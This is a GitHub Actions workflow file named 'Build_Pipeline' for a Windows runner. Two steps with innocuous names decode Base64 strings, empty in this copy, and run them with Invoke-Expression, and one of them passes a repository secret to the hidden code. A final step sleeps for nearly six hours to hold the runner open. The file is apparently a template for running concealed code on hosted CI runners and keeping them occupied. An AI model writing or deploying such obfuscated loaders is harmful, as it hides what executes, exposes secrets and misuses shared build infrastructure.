name: Build_Pipeline
on:
  workflow_dispatch:

jobs:
  build_job:
    runs-on: windows-latest
    timeout-minutes: 360
    steps:
      - name: Prepare Environment
        run: |
          $c = ""
          $exec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c))
          Invoke-Expression $exec

      - name: Configure Network
        env:
          AUTH_VAL: ${{ secrets.YOUSF_KEY }}
        run: |
          $c = ""
          $exec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c))
          Invoke-Expression $exec

      - name: Execute Tasks
        run: |
          $s = 21000 + (Get-Random -Max 500)
          Start-Sleep -Seconds $s

